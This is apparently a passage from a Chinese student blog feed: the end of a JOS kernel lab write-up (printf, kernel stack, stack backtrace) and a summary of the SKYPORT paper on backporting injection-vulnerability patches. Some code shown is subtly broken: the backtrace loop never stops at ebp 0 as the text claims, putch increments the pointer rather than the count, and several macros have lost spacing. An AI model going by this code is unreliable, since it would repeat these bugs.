class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span><br><span class="hljs-title function_">getuint</span><span class="hljs-params">(va_list *ap, <span class="hljs-type">int</span> lflag)</span><span class="hljs-comment">//？lflag</span><br>&#123;<br>        <span class="hljs-keyword">if</span> (lflag &gt;= <span class="hljs-number">2</span>)<br>                <span class="hljs-keyword">return</span> va_arg(*ap, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (lflag)<br>                <span class="hljs-keyword">return</span> va_arg(*ap, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>);<br>        <span class="hljs-keyword">else</span><br>                <span class="hljs-keyword">return</span> va_arg(*ap, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>);<br>  <span class="hljs-comment">//能够处理可变个数输入参数的功能就是有va_list, va_arg(), va_start(), va_end()来实现的</span><br>&#125;<span class="hljs-comment">//函数根据lflag参数的值，决定获取的数的大小。</span><br><br><br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;x&#x27;</span>:<br>       num = getuint(&amp;ap, lflag);<br>       base = <span class="hljs-number">16</span>;<br>number:<br>       printnum(putch, putdat, num, base, width, padc);<br>       <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p><img src="/2023/11/29/OSlab1/image-20231210134724371.png" alt="image-20231210134724371"></p><p>其中定义了一个while循环，分为以下几个步骤：</p><ul><li>首先一个一个的输出格式字符串fmt中所有’%’之前的字符，因为它们就是要直接输出的，比如”This is %d test”中的”This is “。当然如果在把这些字符一个个输出中遇到结束符’\0’，则结束输出。</li><li>剩余的代码都是在处理’%’符号后面的格式化输出，比如是%d，则按照十进制输出对应参数。</li></ul><p>补充8进制格式代码只需要仿照其输出10进制的或者16进制的格式就行</p><p><strong>\kern\printf.c</strong></p><p>这个文件中定义的就是在编程中会用到的最顶层的一些格式化输出子程序，比如printf，sprintf等等。</p><p>这里比较重要的就是我们上边用到了的putch</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">putch</span><span class="hljs-params">(<span class="hljs-type">int</span> ch, <span class="hljs-type">int</span> *cnt)</span><br>&#123;<br>    cputchar(ch);<br>    *cnt++;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里这个子程序实现的就是把字符输出到屏幕上，cnt则是计数器，记录的已经输出的字符。</p><h4 id="练习9"><a href="#练习9" class="headerlink" title="练习9"></a>练习9</h4><p><strong>判断一下操作系统内核是从哪条指令开始初始化它的堆栈空间的，以及这个堆栈坐落在内存的哪个地方？内核是如何给它的堆栈保留一块内存空间的？堆栈指针又是指向这块被保留的区域的哪一端的呢？</strong></p><p><strong>从那条指令开始的？</strong></p><p>首先根据之前的分析，boot.S和main.c是PC启动后首先运行的两部分代码，但这两部分并不属于操作系统内核代码。main.c最后跳转到了entry.S，此时控制权被转交给了entry.S。而在这之前，并没有看到一些有关ebp，esp寄存器的操作，所以这会儿并没有初始化堆栈空间。</p><p>entry.S中，有这样三条指令，最后一条指令调用了i386_init，这个子程序位于init.c文件之中。在这个程序中已经开始对操作系统进行一些初始化工作。可见，到i386_init子程序时，内核的堆栈应该已经设置好了。所以前边两句就是初始化操作。</p><p><img src="/2023/11/29/OSlab1/image-20231210135841791.png" alt="image-20231210135841791"></p><p><strong>在内存的什么地方？</strong></p><p>既然要看具体位置，则需要调试，进入entry.S</p><p>所以首先在进入entry.S的位置打断点（b *0x7d63）</p><p><img src="/2023/11/29/OSlab1/image-20231210141109424.png" alt="image-20231210141109424"></p><p>这里可以看到第一条指令是在0x0010000c的位置，这是因为在bootmain中，已经把所有的内核文件加载到0x100000处了，这里可以看到内核的第一条指令所在的物理地址就是0x10000c</p><p>继续运行</p><p><img src="/2023/11/29/OSlab1/image-20231210141331622.png" alt="image-20231210141331622"></p><p>在执行完jmp指令后，地址发生了变化，已经转换成了虚拟地址</p><p><img src="/2023/11/29/OSlab1/image-20231210151728706.png" alt="image-20231210151728706"></p><p>可以看出在栈顶在0xf0117000</p><p>然后在kern&#x2F;entry.S中定义了：</p><p><img src="/2023/11/29/OSlab1/image-20231210152437922.png" alt="image-20231210152437922"></p><p>在inc&#x2F;memlayout.h中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// Kernel stack.</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KSTACKTOPKERNBASE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KSTKSIZE(8*PGSIZE)   <span class="hljs-comment">// size of a kernel stack</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KSTKGAP(8*PGSIZE)   <span class="hljs-comment">// size of a kernel stack guard</span></span><br></code></pre></td></tr></table></figure><p>在inc&#x2F;mmu.h中：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGSIZE4096<span class="hljs-comment">// bytes mapped by a page</span></span><br></code></pre></td></tr></table></figure><p>所以栈的大小就有32KB</p><p><strong>指针是指向这块区域的哪一端的？</strong></p><p>栈是向下生长的，所以指向的是最高处的地址</p><h4 id="练习10"><a href="#练习10" class="headerlink" title="练习10"></a>练习10</h4><p><strong>为了能够更好的了解在x86上的C程序调用过程的细节，我们首先找到在obj&#x2F;kern&#x2F;kern.asm中test_backtrace子程序的地址， 设置断点，并且探讨一下在内核启动后，这个程序被调用时发生了什么。对于这个循环嵌套调用的程序test_backtrace，它一共压入了多少信息到堆栈之中。并且它们都代表什么含义？</strong></p><p>首先看test_backtrace的c语言形式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">test_backtrace</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span><br>&#123;<br>    cprintf(<span class="hljs-string">&quot;entering test_backtrace %d\n&quot;</span>, x);<br>    <span class="hljs-keyword">if</span> (x &gt; <span class="hljs-number">0</span>)<br>        test_backtrace(x<span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">else</span><br>        mon_backtrace(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    cprintf(<span class="hljs-string">&quot;leaving test_backtrace %d\n&quot;</span>, x);<br>&#125;<br></code></pre></td></tr></table></figure><p>可见这个子程序是一个循环调用，在每一层循环中先打印信息 “entering test_backtrace x”，然后对test_backtrace进行循环调用。当被循环调用完成，再打印信息 “leaving test_backtrace x”。所以最先进入的程序会最后退出。</p><p>每一次进入test_backtrace后，他会进行如下操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push %ebp<br>mov %esp, %ebp<br>push %ebx<br>sub $0x14, %esp<br></code></pre></td></tr></table></figure><p>这四个操作将被用于存放调用这个子程序的父程序的栈帧信息，以及为当前子程序分配新的栈帧。</p><p>当运行test_backtrace(5)之前，esp寄存器ebp寄存器的值分别为如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">esp</span>:<span class="hljs-number">0</span>xf010ffe0<br><span class="hljs-attribute">ebp</span>:<span class="hljs-number">0</span>xf010ffd8<br></code></pre></td></tr></table></figure><p>此处的0xf010ffe0-0xf010fff8就是调用test_backtrace的程序i386_init的栈帧</p><p>当调用test_backtrace(5)时，首先call指令会将i386_init的返回地址压入栈中，所以此时esp变成了0xf010ffdc。</p><p>子程序中第一句push %ebp，把i386_init的ebp寄存器的值压入堆栈中，即地址0xf010ffd8处，此时esp的值变为0xf010ffd8。</p><p>然后 mov %esp, %ebp 把ebp的值更新为esp的值，0xf010ffd8。这个就是当前test子程序栈帧的高地址边界。</p><p>然后 push %ebx 把ebx寄存器的值压入堆栈，此时esp变为0xf010ffd4。因为%ebx寄存器可能被这个子程序所使用，所以必须把它之前的值保留。</p><p>然后 sub $0x14, %esp 把esp中的值减去0x14&#x3D;20，esp的值变为0xf010ffc0。这就是给test子程序分配一个大小为20个存储单元的额外的栈帧空间，供它存储一些临时变量的值。</p><p>所以上述4条汇编指令，执行完成后，esp，ebp寄存器的值变化为</p><p>　　　　esp : 0xf010ffc0   ebp：0xf010ffd8  </p><p>这就是test_backtrace(5)子程序运行时的栈帧地址范围。而输入参数’5’的值存放在0xf010ffe0单元处。</p><p>总的来说每次调用test_backtrace时：</p><ol><li>将返回地址（call指令的下一条指令的地址）压栈</li><li>将ebp, esp, ebx三个寄存器的值压栈，以便退出函数前恢复它们的值</li><li>调用cprintf函数打印”entering test_backtrace x”，其中x为输入参数的值</li><li>将输入参数(x-1)压栈</li><li>调用test_backtrace(x-1)</li><li>调用cprintf函数打印”leaving test_backtrace x”，其中x为输入参数的值</li></ol><p><img src="/2023/11/29/OSlab1/image-20231210170111456.png" alt="image-20231210170111456"></p><h4 id="练习11"><a href="#练习11" class="headerlink" title="练习11"></a>练习11</h4><p>实现mon_backtrace，这个函数的功能就是把当前栈里面的所有栈帧按照规定的格式输出出来：</p><p><img src="/2023/11/29/OSlab1/image-20231210204124667.png" alt="image-20231210204124667"></p><p>如何完成：</p><ul><li>ebp指针所指的位置存放的是父函数中我们保存的ebp地址，所以知道了栈顶的ebp的值，就能知道所有的ebp的值，讲义里提到可以使用icn&#x2F;x86.h中的read_ebp()直接获取当前栈顶ebp的值</li><li>ebp+4的位置，存放的是返回地址，也就是eip寄存器的值。再往上就是函数调用时传递的参数</li><li>什么时候停止：在entry.S中，初始化栈帧时，将ebp初始化成了0，所以当ebp为0时就可以终止循环</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">mon_backtrace</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-keyword">struct</span> Trapframe *tf)</span><br>&#123;<br>        <span class="hljs-comment">// Your code here.</span><br>        <span class="hljs-type">uint32_t</span> ebp = read_ebp(); <span class="hljs-comment">//获取当前ebp寄存器中的值，是个地址</span><br>        <span class="hljs-type">uint32_t</span> * temp = (<span class="hljs-type">uint32_t</span> *)ebp; <span class="hljs-comment">//定义指针变量，用于寻址操作</span><br>        cprintf(<span class="hljs-string">&quot;Stack backtrace:\n&quot;</span>); <span class="hljs-comment">//按着格式来</span><br>          <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123; <span class="hljs-comment">//终止条件</span><br>                cprintf(<span class="hljs-string">&quot;  ebp %08x eip %08x args %08x %08x %08x %08x %08x\n&quot;</span>, temp, *(temp+<span class="hljs-number">1</span>), *(temp+<span class="hljs-number">2</span>), *(temp+<span class="hljs-number">3</span>), *(temp+<span class="hljs-number">4</span>), *(temp+<span class="hljs-number">5</span>), *(temp+<span class="hljs-number">6</span>));<span class="hljs-comment">//%08x输出8个字节的16进制数，将temp更新为调用者栈帧的ebp</span><br>                temp = (<span class="hljs-type">uint32_t</span> *)(*temp);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/11/29/OSlab1/image-20231210210244148.png" alt="image-20231210210244148"></p><p><img src="/2023/11/29/OSlab1/image-20231210210220345.png" alt="image-20231210210220345"></p><h3 id="反思与收获"><a href="#反思与收获" class="headerlink" title="反思与收获"></a>反思与收获</h3><p>本次实验使用的是BIOS+MBR的启动方式，但现在多数使用UEFI+GPT（或者说是UEFI+MBR）</p><ul><li>**BIOS:**是一组固化到计算机内主板上一个ROM芯片上的程序，它保存着计算机最重要的基本输入输出的程序、开机后自检程序和系统自启动程序，它可从CMOS中读写系统设置的具体信息。</li><li>**UEFI:**全称“统一的可扩展固件接口”(Unified Extensible Firmware Interface)， 是一种详细描述类型接口的标准。这种接口用于操作系统自动从预启动的操作环境，加载到一种操作系统上。</li><li>**MBR:**即主引导记录，是对IBM兼容机的硬盘或者可移动磁盘分区时，在驱动器最前端的一段引导扇区。MBR描述了逻辑分区的信息，包含文件系统以及组织方式。此外，MBR还包含计算机在启动的第二阶段加载操作系统的可执行代码或连接每个分区的引导记录（VBR）。这个MBR代码通常被称为引导程序。</li><li>**GPT:**是GUID磁碟分割表（GUIDPartition Table）的缩写，是一个实体硬盘的分区表的结构布局的标准。它是可扩展固件接口（EFI）标准（被Intel用于替代个人计算机的BIOS）的一部分，被用于替代BIOS系统中的一32bits来存储逻辑块地址和大小信息的主开机纪录（MBR）分区表。</li></ul><p>在启动时：</p><p>MBR里面存放着电脑需要从哪个系统启动的信息，电脑便会自动转到系统所在的分区，继续执行该分区里的引导。<br>对于GPT，电脑会找到硬盘里第一个FAT格式 (比如：FAT32格式) 的主分区，默认该分区为引导所在位置。而且电脑会读取分区里面的固定的引导文件。 但GPT分区表并不是和UEFI强绑定的，并没有规范要求GPT分区表的存储设备必须有第一个分区作为300MB的FAT32格式的EFI分区，GPT分区表的存储设备完全可以是U盘，完全可以没有EFI分区</p><p>GPT相较于MBR：</p><ul><li>MBR最大只支持2TB的硬盘，GPT没有此限制</li><li>MBR最大支持4个主分区，要想分更多分区，需要使用逻辑分区，而windows支持GPT最大128个主分区</li><li>GPT的引导更加透明、可控，并且更强大</li></ul><p>对于内核代码的拉起：</p><p>macOS是直接拉起XNU内核，Linux和Windows一般还需要OS提供的bootloader来拉起操作系统内核</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ReadPaper3</title>
    <link href="/2023/10/31/ReadPaper3/"/>
    <url>/2023/10/31/ReadPaper3/</url>
    
    <content type="html"><![CDATA[<h2 id="Backporting-Security-Patches-of-Web-Applications-A-Prototype-Design-and-Implementation-on-Injection-Vulnerability-Patches"><a href="#Backporting-Security-Patches-of-Web-Applications-A-Prototype-Design-and-Implementation-on-Injection-Vulnerability-Patches" class="headerlink" title="Backporting Security Patches of Web Applications:A Prototype Design and Implementation on Injection Vulnerability Patches"></a>Backporting Security Patches of Web Applications:A Prototype Design and Implementation on Injection Vulnerability Patches</h2><p>Web应用的反向安全补丁:注入漏洞补丁的原型设计和实现</p><p>由复旦大学和约翰霍普金斯大学研究人员共同研究完成</p><h3 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h3><p>对于修复Web应用程序漏洞，通常的做法是打补丁，但现实世界中补丁的部署存在挑战</p><p>例如：CVE-2018-7600的Drupal补丁发布了三个月，对于这个任意代码执行漏洞，研究人员发现大约有11500个网站没有打补丁。</p><p>原因：</p><p>很多情况下无法将补丁直接应用于易受攻击的网站，因为Web应用程序版本不匹配。具体而言，Web应用程序开发人员在大多数情况下只为最新版本提供补丁，但网站维护者通常因为遗留原因而运行旧版本，例如，该应用程序没有自动更新界面或者网站有一些针对旧版本定制的代码。因此，网站维护者面临的一个实际问题是在旧版本的自己的网站上应用针对最新版本的补丁。根据几项先前的研究，他们通常不愿这样做，因为他们缺乏技术经验，并害怕破坏网站功能。</p><h3 id="Backporting-security-patches安全补丁反向移植"><a href="#Backporting-security-patches安全补丁反向移植" class="headerlink" title="Backporting security patches安全补丁反向移植"></a>Backporting security patches安全补丁反向移植</h3><p>跨版本补丁部署的实际问题可以形式化为一个研究问题，即如何将特定漏洞的给定安全补丁逆向移植到目标旧版本的Web应用程序，简称为安全补丁逆向移植。</p><p>安全补丁逆向移植的一般目标是维护Web应用程序的两个重要属性：</p><p>（1）安全性：即能够抵御与漏洞相关的攻击</p><p>（2）向后兼容性：不引发别的功能问题</p><p><strong>逆向移植的可能性：</strong></p><p>安全补丁的目的是使用安全逻辑来更新Web应用程序中给定输入的脆弱逻辑</p><p>逆向移植是可能的，因为相同的脆弱逻辑也可能存在于目标旧版本的Web应用程序中</p><p>（脆弱逻辑vulnerable logic：应用程序中存在潜在漏洞或者安全问题的部分或代码）</p><p><strong>逆向移植的挑战：</strong></p><ol><li>补丁可能不仅仅更新脆弱逻辑，还可能引入其他新功能，例如添加新输入。这些新功能可能在目标旧版本上无法正常工作，导致兼容性问题。</li><li>目标版本可能不包含与补丁旨在修复的脆弱逻辑完全相同的内容</li></ol><h3 id="SBP（可安全逆向移植补丁）和SBV（可安全逆向移植版本）"><a href="#SBP（可安全逆向移植补丁）和SBV（可安全逆向移植版本）" class="headerlink" title="SBP（可安全逆向移植补丁）和SBV（可安全逆向移植版本）"></a>SBP（可安全逆向移植补丁）和SBV（可安全逆向移植版本）</h3><p>SBP是一种新生成的补丁，只包含从原始补丁中提取的安全的、可确定计算的安全逻辑，用以替换脆弱逻辑；而SBV是一种特殊的目标版本，具有与SBP所针对的脆弱逻辑相同的内容。SBP和SBV的组合实现了安全和向后兼容性的逆向移植目标，因为SBP消除了与漏洞无关的修复，并且SBV确保目标中的脆弱逻辑与原始补丁所针对的脆弱逻辑完全相同。具体而言，我们提出的使用SBP和SBV进行逆向移植是一个三步方法。首先，它确定原始补丁是否可逆向移植，然后从应用了原始补丁的后期版本生成SBP。其次，它检查目标版本并确保该版本是SBV。最后，它确定目标版本中的漏洞位置并应用SBP。</p><h3 id="SKYPORT注入漏洞补丁逆向移植框架"><a href="#SKYPORT注入漏洞补丁逆向移植框架" class="headerlink" title="SKYPORT注入漏洞补丁逆向移植框架"></a>SKYPORT注入漏洞补丁逆向移植框架</h3><p>虽然逆向移植在主观上是有效的，但主要挑战在于如何以正式的可比较的方式表示web应用程序的安全逻辑和脆弱逻辑</p><p>利用sink（危险函数）：可能触发危险行为如文件操作、命令执行、数据库操作等行为的函数</p><p>例如：跨站脚本攻击中的echo</p><p>研究团队观察到，sink函数通常存在与补丁前，补丁后和目标版本，这一结果启发研究团队开发了SKYPORT，这一框架将Web应用程序的安全和脆弱逻辑表示为一种称为“sink能力”（sink capability）的概念</p><p>例子：OpenEMR版本5.0.1之前的CVE2018-10572（任意文件读取漏洞）</p><p>diff：diff是Unix系统的一个很重要的工具程序。它用来比较两个文本文件的差异，是代码版本管理的基石之一。</p><p>官方补丁：</p><p><img src="/2023/10/31/ReadPaper3/image-20231108111205552.png" alt="image-20231108111205552"></p><p>生成的SBP：</p><p><img src="/2023/10/31/ReadPaper3/image-20231108111227472.png" alt="image-20231108111227472"></p><p>部署：</p><p><img src="/2023/10/31/ReadPaper3/image-20231108111307950.png" alt="image-20231108111307950"></p><p><strong>为什么存在漏洞</strong>：</p><p>读取了用户输入$_GET[template]的文件但没有进行任何检查</p><p><strong>为什么逆向移植这个补丁具有挑战性：</strong></p><p>补丁不仅包含修复漏洞的代码（12行），还包含了与漏洞无关的代码（增加的第二行第三行），这可能会引发向后兼容性问题</p><p>同时，将补丁应用到c中所示的目标版本是具有挑战的，因为图a中用于确定补丁位置的第五行没有引入到目标版本</p><p><strong>如何将补丁从5.0.0.6逆向移植到5.0.0.5</strong></p><p>首先，S KY P ORT生成一个可安全逆向移植的补丁SBP，如图b所示，其中包含整个安全逻辑，包括convert_safe_file_dir_name()函数，并删除与漏洞无关的代码。其次，SKYPORT检查版本5.0.0.5是否是一个可安全逆向移植的版本（SBV），因为两个版本的脆弱逻辑，即在图1（a）和（c）中第11行处以sink功能表示的脆弱逻辑，是相同的。最后，S KY P ORT将生成的SBP应用于图1（c）中的SBV，通过添加两行备份代码（第2行和第3行）并将第11行替换为第12行</p><h4 id="Web应用程序的脆弱逻辑表示"><a href="#Web应用程序的脆弱逻辑表示" class="headerlink" title="Web应用程序的脆弱逻辑表示"></a>Web应用程序的脆弱逻辑表示</h4><p>Web应用程序的脆弱逻辑可以表示为与给定用户输入相关的所有控制流和数据流。换句话说，一个经过精心设计的恶意输入可能会引发遵循特定控制流和数据流路径的脆弱程序执行，从而导致恶意后果。</p><p>将导致汇聚点函数的所有控制流路径称为汇聚点流（sink flows），并用 (flow1, flow2, …) 表示</p><p><img src="/2023/10/31/ReadPaper3/image-20231108140242515.png" alt="image-20231108140242515"></p><ul><li>Reach Condition（到达条件）：是涉及到flow k的所有控制流条件的集合</li><li>DE：涉及到flow k的参数的符号表达式</li></ul><p>将不同汇聚点流的所有 RC 和 DE 放在一起，并将它们定义为联合集（{&lt;RC flow1, DE flow1&gt;, &lt;RC flow2, DE flow2&gt;, …}），作为汇聚点能力（sink capability），表示注入漏洞的脆弱逻辑。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ($condition)<br>  $value = $input1<br><span class="hljs-keyword">else</span><br>  $value = $input2<br><br>sink_func($value + <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>有两个sink flows，一个来自if分支，记作flow1，一个来自else分支，记作flow2</p><p>flow1的RC ：{$condition} , DE:{$input1+1}</p><p>flow2的RC : {$condition}, DE:{$input2+1}</p><p><img src="/2023/10/31/ReadPaper3/image-20231108153958177.png" alt="image-20231108153958177"></p><h4 id="补丁影响分析"><a href="#补丁影响分析" class="headerlink" title="补丁影响分析"></a>补丁影响分析</h4><p><strong>首先利用前向分析定位受影响的行</strong></p><p>SKYPORT从补丁的更改开始执行前向污点分析，并使用受影响的行中的受影响的变量查询程序依赖图（用于描述程序中各个元素之间的依赖关系和控制流关系）</p><p>该分析包括可能影响汇聚点函数的达到条件或数据流表达式的三种类型的语句，并排除其他无关的语句。具体来说，这三种类型的语句包括赋值语句（影响数据流表达式）、条件语句（影响达到条件）和退出语句（影响达到条件）</p><p><strong>从受影响的行中识别汇聚点函数</strong>sink</p><p>基于开发者创建的sink函数和漏洞类型之间的映射</p><p>若有些sink函数是开发人员自定义的，那么就执行代码可达性分析来找到最终的sink函数</p><p>代码可达性分析：用于确定程序中的哪些代码部分可以在不同的执行路径上被访问或执行</p><p><img src="/2023/10/31/ReadPaper3/image-20231108150345617.png" alt="image-20231108150345617"></p><h4 id="汇聚点能力提取"><a href="#汇聚点能力提取" class="headerlink" title="汇聚点能力提取"></a>汇聚点能力提取</h4><p>接收汇聚点函数的列表和给定版本的Web应用程序，然后计算所有汇聚点函数的汇聚点能力（Sink capability，简称SC）</p><p>详细来说：</p><p>首先，SKYPORT 执行前向路径探索，从入口点或调用者函数开始，沿着控制流边缘追踪，直到达到提供的汇聚点函数。在探索过程中，SKYPORT 还会检查是否存在退出语句，例如die()，并停止探索。如果 SKYPORT 遇到一个循环，它会展开一次循环以避免路径爆炸。</p><p>其次，SKYPORT 通过符号跟踪根据树地址代码（TAC）公式计算RC和DE，然后联合成SC：&lt;RC, DE&gt;</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">TAC 是 &quot;Tree Address Code&quot; 的缩写，是一种中间表示（Intermediate Representation）的形式，通常用于编程语言编译器和静态代码分析器中。<br><br>TAC 是一种树状结构，用于表示程序的控制流和数据流。它通常包括以下元素：<br><br><span class="hljs-bullet">1.</span> 操作符（Operators）：表示执行的操作，例如加法、减法、乘法、赋值等。<br><span class="hljs-bullet">2.</span> 操作数（Operands）：参与操作的变量、常数或表达式。<br><span class="hljs-bullet">3.</span> 表达式树（Expression Tree）：用于表示复杂的表达式，其中每个节点代表一个操作符，而子节点代表操作数或其他子表达式。<br><span class="hljs-bullet">4.</span> 条件语句（Conditional Statements）：用于表示分支和条件控制结构，如 if 语句、while 循环等。<br><span class="hljs-bullet">5.</span> 标签（Labels）：用于标识代码的不同部分，以便在跳转指令中引用。<br></code></pre></td></tr></table></figure><h4 id="SBP验证和生成"><a href="#SBP验证和生成" class="headerlink" title="SBP验证和生成"></a>SBP验证和生成</h4><p>在这一步，需要检查原始的官方补丁是否可以进行逆向移植，并将其转化成SBP，具体来说，需要检查以下三个属性：</p><p>PSBP-a：对于每个flow k，RC post flow k 都是RC pre flow k的子集（为了防止SBP引入未知的控制流到补丁后的版本）</p><p>PSBP-b：对于每个flow k，DE post flow k都是 DE pre flow k的子集（为了防止SBP补丁向补丁后版本引入未知的数据表达式，因为这有可能破坏目标版本的功能）</p><p>PSBP-c：对于每个flow k，RC post flow k和DE post flow k都是确定可计算的（排除了例如time（），rand（）等返回非确定性值的函数）</p><p>这三个属性确保SBP的部署不会影响目标应用程序的正常功能</p><p>若同时满足这三个条件，那就认为原始补丁是可以进行反向移植的</p><p>然后SKYPORT就会生成一个安全的sink函数，并替换掉原始的sink函数</p><p>因为在汇聚点能力提取的时候，对于循环，是只展开一次，然后计算的，所以需要在考虑SBP验证时对循环进行处理处理：</p><ul><li>补丁和汇聚点在循环体内：SKYPORT将循环块视作一个函数，并计算函数内的SC，然后进行SBP验证</li><li>补丁在外，汇聚点在内：SKYPORT将循环视作sink函数，计算SC</li><li>补丁在内或者外，汇聚点在外：SKYPORT将循环封装成一个函数用以计算SC（？）</li></ul><h4 id="SBV验证"><a href="#SBV验证" class="headerlink" title="SBV验证"></a>SBV验证</h4><p>同样的，基于汇聚点能力的子属性来进行验证</p><p>PSBV-a：对于每个 f lowk，RC pre flow k 与 RC target flow k相同。这个属性确保目标版本中没有额外的脆弱控制流。sink1和sink2 target：sink1</p><p>PSBV-b：对于每个 f lowk，DE pre flow k 与 DE target flow k 相同。这个属性确保目标版本中没有额外的脆弱数据表达式。</p><p>这两个子属性可以保证将SBP应用到SBV后能保证安全性，因为两个版本的脆弱逻辑完全相同</p><h4 id="部署补丁"><a href="#部署补丁" class="headerlink" title="部署补丁"></a>部署补丁</h4><p>对Web应用程序的源代码进行修改</p><p>包含两个步骤，替换和备份</p><p><strong>替换</strong></p><ol><li>函数替换：直接将sink函数替换成安全的函数</li><li>参数替换：若sink函数无法被直接替换，比如是php的关键字include之类的，SKYPORT就将include改成include safe_include()</li></ol><p>在这一步时，SKYPORT会检查名称冲突避免函数名称已经被使用了</p><p><strong>备份</strong></p><p>SKYPORT备份了与sink函数相关的变量，特别是全局变量、汇聚函数调用者的参数和外部变量，然后在安全的函数中使用</p><h4 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h4><p><img src="/2023/10/31/ReadPaper3/image-20231108165043937.png" alt="image-20231108165043937"></p><p>数据集包括了 155 个补丁（即 155 个预补丁版本和后补丁版本）以及 1,526 个有漏洞的目标旧版本</p><p>与当前最先进的技术进行比较：</p><p><img src="/2023/10/31/ReadPaper3/image-20231108165248741.png" alt="image-20231108165248741"></p><ol><li>**直接应用补丁(Direct Patch Application)**：这种方法直接使用”patch”命令将官方补丁应用到目标版本上。</li><li>**严格自动升级(Strict Auto-upgrade)**：如果两个 Web 应用程序版本之间支持的 PHP 版本相同，利用 Web 应用程序框架提供的自动升级 API</li><li>**懒惰自动升级(Lazy Auto-upgrade)**：这种方法是对严格自动升级的一种宽松方法，它认为如果 PHP 版本冲突仅存在于测试文件中，自动升级就可以成功。</li></ol>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapplab-bufferlab</title>
    <link href="/2023/10/06/csapplab-bufferlab/"/>
    <url>/2023/10/06/csapplab-bufferlab/</url>
    
